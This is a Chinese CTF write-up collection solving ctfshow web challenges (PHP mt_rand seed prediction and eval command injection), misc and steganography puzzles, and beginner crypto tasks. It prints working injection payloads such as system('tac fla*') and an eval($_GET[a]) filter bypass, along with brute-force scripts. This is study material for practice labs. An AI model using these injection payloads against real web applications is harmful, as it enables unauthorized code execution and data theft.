/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 13:26:39# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 13:53:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/

error_reporting(0);
include("flag.php");
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(372619038);
    if(intval($r)===intval(mt_rand())){
        echo $flag;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}

?>
Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023
```

在这个代码中，`flag.php`文件的内容只有在满足特定条件的情况下才会被显示。具体来说，需要提供一个`r`参数，使得其整数值等于一个固定的随机数。这个随机数是通过`mt_rand()`函数生成的，但是由于在生成随机数之前设置了随机数生成器的种子`mt_srand(372619038)`，所以这个随机数是固定的。也就是说，每次运行这段代码时，`mt_rand()`函数都会返回相同的随机数，也就是伪随机数，写一份脚本

```php+HTML
<?php
mt_srand(372619038);
echo intval(mt_rand());
?>
```

r=1155388967

url/?r=1155388967即可得到flag

#### web25

进入靶场之后可以看到一段代码

```php+HTML
<?php
/# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 13:56:57# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 15:47:33# @email: h1xa@ctfer.com# @link: https://ctfer.com*/
error_reporting(0);
include("flag.php");
if(isset($_GET['r'])){
    $r = $_GET['r'];
    mt_srand(hexdec(substr(md5($flag), 0,8)));
    $rand = intval($r)-intval(mt_rand());
    if((!$rand)){
        if($_COOKIE['token']==(mt_rand()+mt_rand())){
            echo $flag;
        }
    }else{
        echo $rand;
    }
}else{
    highlight_file(__FILE__);
    echo system('cat /proc/version');
}
#Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) 180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 Linux version 5.4.0-163-generic (buildd@lcy02-amd64-067) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) 180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023
```

这段代码的目的是需要找到一个特定的`r`参数和`token`cookie才会显示`$flag`，需要提供一个`r`参数和一个`token`cookie，使得它们满足以下条件：

1. `r`参数的整数值等于一个固定的随机数。这个随机数是通过对`$flag`变量进行MD5哈希，然后取哈希的前8个字符，将其从十六进制转换为十进制，然后种子传递给`mt_srand()`函数，最后通过`mt_rand()`函数生成的。
2. `token`cookie的值等于两个随机数的和。这两个随机数是通过`mt_rand()`函数生成的。

先对r参数进行测试，输入url/?r=0，可以得到r参数的相反数，随后使用一个新工具–php_mt_seed进行破解

```linux
$ ./php_mt_seed r=0后得到的数组
```

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699867949918-682663dc-64e9-49dc-8151-00a54ec4c902.png)

随后开始获取cookie，收个回应报头先

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699868143563-34ef1ed2-d715-4d35-9b97-c3e9ae4a06ae.png)

由于服务器对应php版本是7.3.11，所以我们seed值取2657120068（每一次开靶场都不一样），随后使用以下脚本对seed进行解密

```php+HTML
<?php
error_reporting(0);
    mt_srand(2657120068);
    echo mt_rand();
    echo "===";
    echo(mt_rand()+mt_rand());
?>
```

输出`594406994===2637184074`

前面是r值，后面是cookie值

对发送请求进行修改

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699868307330-6efba0e7-b9ac-4508-aaa2-9246ce97a10a.png)

随后即可得到flag

#### web26

对安装界面进行抓包就好了

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699888890631-0c5cd8f6-56ba-4a1f-89f4-e839f519da23.png)

#### web27

先对靶场进行信息收集，可以查询到一个表格，里面有姓名和隐藏日期的身份证号



![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699932149321-a9a02643-2e62-418d-9bce-abba1f719fe6.png)

随后任选其一，进入学籍查询系统，将姓名填入，密码填入后抓包

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699932357079-1cacc32f-8310-4513-9004-2654a659c6d3.png)

可以看到最后一行明文传输用户名和密码，由于身份证格式的问题，所以只需要在*处对日期进行爆破即可，配置payload如下

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699932459711-dc9ade19-4f81-4534-ae93-db7399cb9284.png)

![image-20231114113007601](C:\Users\Luo_bei\Desktop\ctf\01 Markdowns\image-20231114113007601.png)

进行爆破后可以看到19900201项length不同，进行查询即可得到账密，登录即可得到flag

#### web28

文件目录爆破

进入靶场之后进行了重定向，定向到了url/0/1/2.txt，尝试删除.txt发现重定向变成了死循环，无法打开网页，删除2.txt后收到403回应，于是可以确定题目方向为目录爆破，使用burpsuite的集束炸弹模式，设置两个payload型为number，设定范围（0-100）以及step（1）进行爆破后会在一群403中看到一个200，查看回应报文即可得到flag

### 命令执行

#### web29

进入靶场，看到网页运行源代码

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这串代码是一个PHP脚本，用于接收一个名为c的GET参数，并将其作为PHP代码执行

判断是否存在c参数，如果存在，就将其赋值给变量`$c`。
使用正则表达式检查  `$c`中是否包含flag字符串，如果不包含，就调用eval()函数执行 `$c`中的代码。

eval()函数是一个PHP语言结构，可以将一个字符串作为PHP代码来执行。
如果不存在c参数，就使用highlight_file()函数显示当前文件的源代码。highlight_file()函数是一个PHP内置函数，可以将一个文件的PHP代码以高亮显示的方式输出。

这道题的关键在于eval()函数，它可以将一个字符串作为php代码执行，于是可以进行php注入

先调用操作系统函数ls对其目录进行扫描

`url/?c=system("ls")`

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700030601828-2912bf33-6fbb-4a53-930f-9c5cb291ce16.png)

发现文件中有flag.php，但是并不能对其直接进行定向，因为之前的代码过滤已经过滤掉了flag字样，当出现flag字符串之后就会被屏蔽掉，那么我们就不能那么直白的对flag进行定向

那么就要用上我们的通配符了

```
通配符是一类键盘字符。
当查找文件夹时；当不知道真正字符或者不想键入完整名字时，常常使用通配符代替一个或多个真正字符。
星号（*）
可以使用星号代替零个、单个或多个字符。如果正在查找以AEW开头的一个文件，但不记得文件名其余部分，可以输入AEW*，查找以AEW开头的所有文件类型的文件，如AEWT.txt、AEWU.EXE、AEWI.dll等。要缩小范围可以输入AEW*.txt，查找以AEW开头的所有文件类型并.txt为扩展名的文件如AEWIP.txt、AEWDF.txt。
问号（？）
可以使用问号代替一个字符。如果输入love？，查找以love开头的一个字符结尾文件类型的文件，如lovey、lovei等。要缩小范围可以输入love？.doc，查找以love开头的一个字符结尾文件类型并.doc为扩展名的文件如lovey.doc、loveh.doc。
通配符包括星号“*”和问号“？”
星号表示匹配的数量不受限制，而后者的匹配字符数则受到限制。这个技巧主要用于英文搜索中，如输入““computer*”，就可以找到“computer、computers、computerised、computerized”等单词，而输入“comp？ter”，则只能找到“computer、compater、competer”等单词。
```

那么这道题就有两种解法

解法一：url/?c=system(“tac fla?.php”);(输入之后引号和空格会自动变成utf-8形式)

解法二：url/?c=system(“tac fla*”);

##### cat：连接多个文件并打印到标准输出。

##### tac：连接多个文件并以行为单位反向打印到标准输出。

随后出现flag

其实cat也不是不能获取，就是这道题很狗，人家把flag放到了最下面，前面都用空格然后超过了显示长度导致cat第一眼看不见，可以试着进源代码，这样就能看见了

#### web30

这道题的解题方法可以继承到上一道题中

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这道题将system命令过滤了，所以我们就无法将上一道题的方法继承下来了

但是就只需要换一个思路就能解出来这道题，我们可以猜到flag肯定还在老地方，我们只需要更改一下?c的参数即可

改成这样

`url/?c=echo 'tac fla*';`

很好，flag成功出来了

$c = “echo `tac fla*`”;

- 使用eval()函数来执行$c中的代码，eval()函数是一个PHP语言结构，可以将一个字符串作为PHP代码来执行。例如：

eval(“echo `tac fla*`”);

- 使用echo语句来输出一个反引号中的命令的结果，反引号是一种命令替换的方式，可以先执行反引号中的命令，然后将输出结果替换到原来的位置。例如：

echo `tac fla*`;

这个命令的含义是使用tac命令来反向显示以fla开头的文件的内容，tac命令是cat命令的反向版本，可以将文件的内容从最后一行开始显示，这样可以绕过一些过滤规则

#### web31

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

~~不留活路是吧（怒）~~

你不让我在?c里面干这些事情那我就再定义一个变量，在另外一个变量里面执行操作，我看你还管不管得到我

```php
url/?c=eval($_GET[a]);&a=system('tac flag.php');
```

这下我都能不装了摊牌了，老子就是要你的flag你给我不给我拿吧

#### web32

## CTFSHOW_CAIGOU_WriteUp

### 谜之栅栏

解压发现两张图片，图片名为找不同，使用010的compare进行分析可以得到以下栅栏密码

```
cfhwfaab2cb4af5a5820}
tso{06071f997b5bdd1a
```

使用工具进行解密（栅栏数为2）

`ctfshow{f0a6a0b721cfb949a7fb55ab5d8d210a}`

### 你会数数吗

解压压缩包发现文件未指定类型，使用010打开发现为普通字符串，根据题目提示“你会数数吗”尝试统计字符串字数（即统计每个字符在文件中出现的频率）可发现flag

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699269917146-b842d84b-58d4-46c2-8509-336fcf30b6be.png)

使用脚本进行提取

```python
import re
from collections import Counter


# 定义一个函数，用于统计字母的个数
def analyze_letter_count(text):
    # 从文本中提取出所有字母
    letters = re.findall(r'\S', text)
    # 统计所有字母的个数
    counter = Counter(letters)
    return counter


# 将文本存入变量
# 调用函数分析字母个数
def re_letter(s):
    regex = r'\'(.*?)\''
    new_string = re.findall(regex, s)
    return new_string


text = input("输入文本:")
letter_count = analyze_letter_count(text)
strings = str(letter_count)
# print(letter_count)
print(''.join(re_letter(strings)))

```

`ctfshow{a1b2d3e4g56i7j8k9l0}`

### 你会异或吗

文件解压后发现一张png但是无法打开，使用010打开后也没有明显的png文件内容，根据题目提示对其对应的十六进制编码进行异或运算，根据题目描述可以知道xor参数为50，将参数填入后进行计算即可得到正常的png文件

`ctfshow{030d0f5073ab4681d30866d1fdf10ab1}`

### you_and_me

解压后发现两张图片，使用010打开其中一张图片，在图片“you”中发现一串ascii字符

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699271677210-e954ff2f-bc52-4632-9259-054256ef95c0.png)

好好好出题人你用ai是吧

中间看到watermark，可能是盲水印隐写

使用bwmforpy3.py进行分离

`py bwmforpy3.py decode you.png you_and_me.png wm1.png`

可以得到flag

`ctfshow{CDEASEFFR8846}`

### 我吐了你随意

```
dd师父父鸭❤️，想找一个男师父来宠我辽 ٩(๑‌‌‌‌‍‬‌﻿•ㅂ•)۶。要求如下鸭🌸，国赛三等奖及以上吖（重点，画圈圈），给窝包flag和jio‌‌‌‌‍﻿‍‌本辣种（开心❤️(≧▽≦‌‌‌‌‍‬‍‬)。
不要有战队的那种师父父o╰(‌‌‌‌‍﻿‌﻿*´︶`*)╯，因为有战队的话窝怕你队友会生我的气鸭💦（点点头qaq‌‌‌‌‍‬‬‌）
如果实在不行有战队的师父父窝也不介意的辣QVQ🌸！你就把你队友当成玩玩的就行叭✨，你每天陪窝更多就行啦‌‌‌‌‍‬﻿﻿~ ‌‌‌‌‍﻿‍﻿（害羞羞地扯了扯你的衣服袖子 (*๓´╰╯`๓)
另外另外🎉！窝占有欲非常强o💦（叉腰并且理直气壮！）所以希望你只有我一个可耐耐的徒徒辣（开心地看着你 (*‌‌‌‌‍﻿‬﻿≧▽≦) 所以你不能有别的徒徒鸭⭐‌‌‌‌‍‌﻿﻿，要不然我会炒鸡炒鸡桑心的o‌‌‌‌‍‍‌‌呜呜呜（突然委屈巴巴地看着你）
当然辽（突然开心地笑✨），你也不能散养窝鸭(๑•ູ॒॒̀‌‌‌‌‍‍﻿﻿•̀‌‌‌‌‍‬‬‍ູ॒॒•ູ॒॒̀•ູ॒॒̀•́๑)，所以窝希望你最好每天都替窝做题~窝一直在旁边打游戏辣种叭❤️ (/^▽^)/
⭕对辽‌‌‌‌‍﻿‌﻿，还有鸭！（开心地举手手٩(ˊᗜˋ*)و，窝炒鸡喜欢高强度帅哥❤️，所以嘛你必须是最牛的呀🌈，永远不会变菜菜的辣种（对你点点头⸜₍๑•‌‌‌‌‍‍﻿﻿⌔•๑₎
当然啦!希望师父父三次元阔以是一个190+的寸头大帅锅啦‌‌‌‌‍‬‍‬✨! 最好还有富有磁性声线温软温润如玉温和冷冷的清冷的嗓音❤️ (一双圆溜溜的大眼睛调皮地眨了两下小鼻子不自觉地皱了皱卷曲的海藻般的长发披散着将娇小的身躯衬得更加柔弱甜甜的小奶音吐出小粉拳也不自觉地捏紧了睡裙的蕾丝花边开心地看着你)
希望师父父和窝不涉三次元以及谈恋爱o‌‌‌‌‍‬﻿﻿💦（羞涩地看着你），因为窝俩的关系只是师父父和徒徒嘛💖。但是可以...鸭（脸红害羞）‌‌‌‌‍﻿‌‬
‌‌‌‌‍‍﻿﻿人家...人家还会骂师父父是大坏蛋的o🌈‌‌‌‌‍‌﻿﻿（脸红哭泣），但是师父父不能凶人家！，只能喊窝宝宝‌‌‌‌‍﻿‍‬o（委屈），要不然..‌‌‌‌‍‬‍‍.人...人家不要你辽！💦（‌‌‌‌‍﻿‌‬哼唧唧）
‌‌‌‌‍‍﻿﻿🌈最后最后，‌‌‌‌‍‍‌‌人家会喊你师父父的！（继续脸红哭泣）所以球球来人叭🎉（其实人家想喊你哥哥酱辣‌‌‌‌‍‬﻿﻿，但是人家怕你讨厌人家✨...）ξ‌‌‌‌‍﻿‍﻿( ✿＞◡❛‌‌‌‌‍‬‍‍)
窝敲可爱的辣~‌‌‌‌‍﻿‌‬‌‌‌‌‍﻿﻿‍
```



文件名给的提示太明显了（

直接零宽隐写解密

`ctfshow{OP_is_for_Over_Power}`

### 这是个什么文件

压缩包有密码，使用爆破软件发现很长时间都没法爆破，怀疑是伪加密，使用010打开并且删除加密字符串发现能够正常打开，压缩包中有一个文件，使用010打开后发现有py字样，怀疑是pyc文件或者是py文件，事实证明为pyc文件，对pyc文件进行反编译后运行即可得到flag

```python
flag = bytes([
    99,
    116,
    102,
    115,
    104,
    111,
    119,
    123,
    99,
    100,
    106,
    110,
    106,
    100,
    95,
    53,
    54,
    53,
    102,
    95,
    71,
    67,
    68,
    72,
    95,
    107,
    99,
    114,
    105,
    109,
    125]).decode()
print(flag)
```

`ctfshow{cdjnjd_565f_GCDH_kcrim}`

### 抽象画

~~这道题有够你吗抽象的~~

解压压缩包，发现一个txt文件，打开后发现不明密码，使用CyberChef进行解密（magic）

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699286920990-9714e36b-008a-48f4-9e51-6491c7439e4b.png)

发现base58解码发现89 50 4e 47(png)于是使用base58进行解码

```hex
89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 00 00 00 49 00 00 00 12 08 03 00 00 00 20 e4 03 da 00 00 00 3f 50 4c 54 45 ff ff ff ff c0 c0 ff ff c0 c0 ff c0 c0 ff ff c0 c0 ff ff c0 ff ff 00 00 ff ff 00 00 ff 00 00 ff ff 00 00 ff ff 00 ff c0 00 00 c0 c0 00 00 c0 00 00 c0 c0 00 00 c0 c0 00 c0 ff ff ff 00 00 00 cc 44 ef f2 00 00 01 91 49 44 41 54 38 8d ad 94 d9 6e 03 21 0c 45 cd 32 6c 83 87 45 f9 ff 6f ad c1 06 d2 aa 95 fa 90 a3 3c 20 f0 d8 d7 17 13 f0 a8 4a 31 4c b4 17 73 3b d5 09 e7 72 ee 8c c3 87 d1 a5 46 a2 98 d6 56 70 2b 0e 36 ba a1 f7 1e 3c f4 9c 6b b2 93 3b 95 c8 84 71 38 00 5a c0 13 82 d6 fa 6d f3 b2 f1 64 ba 99 96 e5 14 43 d4 93 40 2a 64 65 b8 80 4d 97 6b 17 22 2a 08 61 09 0d b9 48 a6 e8 34 6d a0 93 5e 58 d8 6f a2 58 d0 f8 da e8 29 51 b6 71 35 d8 e1 9b 98 f0 24 da 40 46 3d 85 31 b5 a5 6a 87 7d 93 ac 96 da a7 9b d3 9d b6 b5 4e 83 8e 10 48 91 14 4c 86 94 9e 9d f3 b9 89 0f 3b ca 14 85 5a e5 9d e9 4f 0d 44 9d d8 c4 54 f0 da 9c 0e c0 d3 cf e5 84 2b 53 52 86 3e 8d 34 09 47 88 07 72 62 97 a6 f3 18 6b d1 e2 f1 0f 4b ad 5d 99 30 fe e9 cb 16 73 67 a6 fb a0 06 14 af 94 ac 9a 5e 89 12 99 b0 ab b0 a1 63 a9 dc 2d e3 67 a3 4c ef 90 c6 ab 37 1b 29 4e 32 d9 f6 e3 f2 c6 ed 89 41 95 0e f7 9c fb 29 e4 84 32 c5 a8 24 99 5c 19 77 42 a5 f3 5d a5 19 20 9f b6 2b 34 44 73 7e 96 ec 66 a5 4a 4a 8f 0c fc 1a 4c f0 48 a9 b7 3d cc d5 71 bc bb f1 fa 96 41 cc 13 93 89 f4 de 24 ec 8e fd bc 96 70 29 f2 7a 4d 2c 95 a2 db e0 aa c7 21 ed c5 60 f4 8a 04 9f b9 6f f5 0c 26 d0 83 83 b7 82 f4 b7 f0 76 7f e0 5f f0 29 3e 95 ea e5 3f 26 ea f5 9f 44 5f ed ce 23 44 59 16 0b e7 00 00 00 00 49 45 4e 44 ae 42 60 82
```



然后将解码出的hex值使用010创建新文件

~~(一定要用crtl+shift+v不然你这辈子都没法把16进制粘贴进去)~~

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699287432093-e6ea7964-8411-4b6f-a9c9-653cda6efcf0.png)

然后就是这个抽象东西（

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699287559138-f5621fc2-022c-4777-a4e8-95cfebdff7af.png)

那么接下来咱们就要用到一个新工具了（乐

npiet

一个抽象画解密软件（只能这么描述了

双击后打开了一个命令行，而且已经在这个工具文件的目录下了，直接输入命令：

`npiet.exe -tpic xxx.png(写路径)`

然后就会输出flag了

`ctfshow{dec8de_frejnv_frejer89}`

### 迅疾响应

~~又是一个巨诡异的题~~

文件解压后发现一个二维码，但是怎么扫都没办法扫出来，使用在线工具[qrazybox](url:https://merri.cx/qrazybox/)导入后点击tools，选择第一个解析

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699288960986-f1b0d348-0b1d-466a-875d-5c842f751ce4.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699288985921-b2e7aa2f-d776-4aaa-a3d3-c59ce26c1583.png)

可以解析出一部分flag

`ctfshow{11451419-1981-`

~~好臭~~

然后就是我看别人wp了（这玩意我还没摸明白原理）

那另一部分去哪里找呢？根据官方wp，是将【纠错区】涂白，然后和之前一样，点击Tools、点击Extract QR Information，就看到了flag的另一部分。
这里放心去涂白就行了^_^，因为这是块特别的区域嘛，工具其实已经把它给“圈出来了”，我们只要把手放在边框内就不会涂出去或者涂错，

------------------------------------------------

原文链接：https://blog.csdn.net/qq_38798840/article/details/128145527

然后另一部分就是`landexiangle}`

### 我可没有骗你

发现压缩包加密，使用爆破工具可以提取出密码

`55813329`

随后解压可以发现一个mp3文件，听了之后没有发现明显线索，使用010打开发现文件是wav文件，更改一下后缀名（好习惯）使用010分析没有发现明显线索，怀疑工具加密，那么音频隐写大多都用什么工具呢

#### **wbStego**

#### **silenteye**

#### Audacity

#### DeepSound

#### MMSSTV

#### e2eSoft

等等

这道题由于没有提示只能一个一个去试，在silenteye中发现flag

decode->high

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699318949770-2560b5fe-5b7d-4f42-87d6-85109fc0f7ea.png)

`ctfshow{aha_cdsc_jejcfe5rj_cjfr24J}`

## 攻防世界刷题

### banmabanma

直接进行条形码识别

### 适合作为桌面

文件解压后发现一张图片，使用010解析未发现问题，随后使用Stegsolve进行图层分析后在红色通道中发现二维码

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699422468659-49171f0b-2d4e-4a5b-afd4-2bbb2ab7980b.png)

解析后发现十六进制码，新建一个十六进制文件，在十六进制转ascii码中发现py字样，怀疑文件为py或pyc，事实证明文件为pyc，进行pyc反编译py后运行得到flag

### pure_color

使用Stegsolve进行颜色通道分析即可得出flag

### 心仪的公司

#### 解法一

使用wireshark进行流量分析

在过滤器中寻找http协议下的shell

`http contains "shell"`

挨个寻找，最终在最后一个jpg文件中的ascii码中得到flag

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699491251393-b9fccdde-c59b-4e37-b922-0d960b7767a4.png)

#### 解法二：使用010打开流量分析包，按照类似flag的形式进行查找

`f fl flag f1ag fl4g`

等等

在搜索fl的时候发现类似flag的字符串

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699490754308-98d4c635-32ea-481d-98a1-60b9ba9c2b12.png)

填入后发现为正确flag

`fl4g:{ftop_Is_Waiting_4_y}`

### 2017_Dating_in_Singapore

题目描述：

```
01081522291516170310172431-050607132027262728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625
```

附件是一个日历，使用010打开未见异常，也没有存在pdf隐写的内容

于是开始分析题目描述

可见题目描述全部都为10进制数，尝试转字符后无效，发现间隔符，将间隔全部手动格式化后如下

```
01081522291516170310172431
050607132027262728
0102030209162330
02091623020310090910172423
02010814222930
0605041118252627
0203040310172431
0102030108152229151617
04050604111825181920
0108152229303124171003
261912052028211407
04051213192625
```

可以发现行数是和月份对应的，由于十进制数在有双位数字时习惯用0补位，所以猜测可能是两位数字为一组，进行拆分后格式如下

```
01 08 15 22 29 15 16 17 03 10 17 24 31
05 06 07 13 20 27 26 27 28
01 02 03 02 09 16 23 30
02 09 16 23 02 03 10 09 09 10 17 24 23
02 01 08 14 22 29 30
06 05 04 11 18 25 26 27
02 03 04 03 10 17 24 31
01 02 03 01 08 15 22 29 15 16 17
04 05 06 04 11 18 25 18 19 20
01 08 15 22 29 30 31 24 17 10 03
26 19 12 05 20 28 21 14 07
04 05 12 13 19 26 25
```

尝试查找这串十进制数在日历中有什么规律

随后发现将十进制数当成日期可以画出来字符，完整图片如下

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699491581568-d40e5958-7d4b-467b-845e-a646250f422e.png)

得到flag

`HITB{CTFFUN}`

## Pearlsky-BeginnersGame 2023

### Crypto

#### 快来签到！

`SVFWI{elqjh_szq_tlqbxdq}`

简单的凯撒密码，去在线解密网站里面将偏移值改成3就好

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700290582682-e815d1f9-04ef-4630-b564-4e947800dd63.png)

好一个pwn

#### easy_rsa

```python
from Crypto.Util.number import *
from secret import flag

m = bytes_to_long(flag)
e = 65537
p = getPrime(512)
q = getPrime(512)
n = p*q
c = pow(m,e,n)

print(p)
print(q)
print(c)

# 8384925867744796153527366818437649735013662531874803670739984568881268846920404769113962724441821224517599325116228918252764292519631593812671744487377507
# 9414383987932537581962400696785078397778332219689657513384112714031340896076184281169207663246076212324523096276077380200718902731661668334298955818696213
# 43112607948723112651551543062968118315200985936425454426098221460397002226862970251479688607921791320559197751996109974999936160901845770315346095823691013082208027749241103089394173840338534295300799598132166352013983710851720398402838508021451456877633423118646001865643940555919025793820705936800768130144
```

简单的rsa解密

```python
from Crypto.Util.number import *

p = 8384925867744796153527366818437649735013662531874803670739984568881268846920404769113962724441821224517599325116228918252764292519631593812671744487377507
q = 9414383987932537581962400696785078397778332219689657513384112714031340896076184281169207663246076212324523096276077380200718902731661668334298955818696213
c = 43112607948723112651551543062968118315200985936425454426098221460397002226862970251479688607921791320559197751996109974999936160901845770315346095823691013082208027749241103089394173840338534295300799598132166352013983710851720398402838508021451456877633423118646001865643940555919025793820705936800768130144

n = p * q
phi = (p - 1) * (q - 1)
e = 65537
d = inverse(e, phi)
m = pow(c, d, n)
flag = long_to_bytes(m)

print(flag)

```

解密后得到 

```
PSCTF{dGhpc19pc190cnVlX2Jhc2U2NA==}
```

直接提交发现错误，拉入cybercherf后进行magic解密

`this_is_true_base64`

按照格式提交即可

#### 我们也有自己的编码！

```
密文：
2053 0226 1412 0171 0048 6008 2589 5261 1569 4104 3024 6357

flag格式：PSCTF{**********ctf**}
```



打开文件后发现应该是每四个编码对应一个字符，通过题目描述“我们也有自己的编码”尝试是否为中文编码，上网查询到中文电报码是每4位对应一个字符，解密后可以得到

`我们将来也要有自己的比赛`

按照*填入后提交flag即可

#### 尊嘟假嘟O.o

纯纯整活题

```
密文：
Ö.o O.0 Öw0 OvÖ Ö.0 O.o Ö_0 ovÖ o_0 O.O 0w0 0.0 o_o ow0 o.0 0.0 o_o ow0 o.0 0w0 Ö.Ö owO Ö_0 0w0 o.O owO Ö.0 o_Ö Ö_0 0vO Ow0 0w0 Ö_0 owÖ owo 
```

按照给出的网址进行解密

`PSCTF{this_is_a_fake_flag}`

交上去..是这确实是一个假的

卡了半天才知道

把fake改成true就好了

~~出题人出来挨打~~

#### 小时候最害怕的一集

~段烨出来挨打！！！~

直到出来hint之后才知道该怎么做（离谱的捏）

```
密文：
qavbyybqdvhpdrdlhhpdmgiurp

flag格式：单词之间用_隔开

小时候，我们最讨厌写作业了。

那天是开学的前一天晚上，你补作业补到很晚，困意袭来，不知不觉睡着了......

你梦见新学期到来了，你的作业还没完成。

3个老师同时请你喝茶，7个损友在办公室窗户外面偷笑着看你出糗。
经过风暴洗礼后，老师要求你罚抄15遍《中小学生守则》，最后出办公室前还给了你2个橘子，让你以后不准再这样了。

你醒来了，不禁回味，多美好的童年啊，可你现在已经18岁了。
```

hint:hill

好好好希尔密码是吧

我们可以知道希尔密码需要四个密钥，但是题目中有五个数字，优先试前四个数字

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1700367090544-944b242d-e008-47e5-b36d-9853d7db4a43.png)

黑客不写作业是吧（樂）

#### sevenG0

```python
import hashlib
from secret import flag

# Remove head and tail of the flag,check its format and length
assert flag[:6] == "PSCTF{"
assert flag[-1:] == "}"
flag = flag[6:-1]
assert len(flag) == 12

'''

Hey,bro.Welcome to sevenG0's world!

Now you wander his world,so you want to escape the world.

You have three choices to help you escape the world:

1.Work fastly to decode Choice 1,but this method is busy.
2.Work simply to decode Choice 2,but this method is inefficient.
3.Exit this py file,but you will be trapped in the world forever.

If you decode one of Choice 1 and Choice 2,you will get the flag as the key to escape the world.

But you aren't alone because you have a hash cat,maybe it can give you a hand at key times.

Right now,make your choice:

'''

# Choice 1
print(hashlib.md5(flag[:3].encode()).hexdigest())
print(hashlib.sha1(flag[3:6].encode()).hexdigest())
print(hashlib.sha224(flag[6:9].encode()).hexdigest())
print(hashlib.sha256(flag[9:12].encode()).hexdigest())

'''
Choice 1 output:
  74ae88178f23d39281113deece3efa90
  87250fc4c714cf6b5b472cec4638750c383123e4
  c7d063991f2a6214b55a9f20060e8db337bdf93821f9ee9821b7fff7
  2fec9da861d9152a37f0d981446e9fa9874fb94020d68dbbb84484494e4e11cd
'''

# Choice 2
print(hashlib.md5(flag[:6].encode()).hexdigest())
print(hashlib.sha1(flag[6:12].encode()).hexdigest())

'''
Choice 2 output:
  dc25504c9e60bad6761171f8e75bdaa6
  93025d9f4ea0e9d48daa05b794275c25ccc18010
'''


# Choice 3
print("Waiting for binge's pwn!")

'''
Choice 3 output:
  Waiting for binge's pwn!
'''

```

有够抽象的

两种方法，一种是四个不同的加密方法（md5、sha1、sha224、sha256）对整个flag的12个字符进行加密（一段3个字符），进行爆破即可解出（一定要加上特殊字符）



另一种方法是一个md5一个sha1解密就行，但是sha1很难解密，所以我用的第一种做的

举例写个代码（sha224）

```python
import hashlib
import itertools

def crack_sha224(hash_value, charset, length):
    combinations = itertools.product(charset, repeat=length)
    for combination in combinations:
        guess = ''.join(combination)
        if hashlib.sha224(guess.encode()).hexdigest() == hash_value:
            return guess
    return None

# 使用方法
hash_value = 'c7d063991f2a6214b55a9f20060e8db337bdf93821f9ee9821b7fff7'
charset = 'abcdefghijklmnopqrstuvwxyz'
length = 3

print(crack_sha224(hash_value, charset, length))

```

### web

#### web1-签到

`最基础的信息搜集之我的机器人助手`

显而易见，url/robots.txt

#### web2-签到plus

解法一

```php
<?php
header('Content-Type: text/html; charset=utf-8');
show_source(__FILE__);
if(!isset($_GET['web2'])||!isset($_POST['fish1'])){
    echo("不对劲吧大哥...");
}else{
    $web2 = $_GET['web2'];
    $fish1 = $_POST['fish1'];
    if(is_numeric($fish1)){
        echo "fish不能是数字！";
    }else{
        if($fish1>123456){
            include($web2);
        }
    }
};
?> 
```

分析一下代码

首先判断了GET请求中是否有web2参数，以及POST请求中是否有fish1参数。

如果没有，就输出“不对劲吧大哥…”。

然后if-else语句用于处理web2和fish1参数的值，并且将GET请求中的web2参数赋值随后将POST请求中的fish1参数赋值，

判断fish1是否是一个数字，

如果是，就输出“fish不能是数字！”。跳出循环，判断fish1是否大于123456，如果是就使用include函数，将web2的值作为一个文件名输出

那么我们现在就有两个目标，第一，给予web2一个参数，第二，找一个大于123456的数字赋值给fish1，并且不能通过数字型赋值

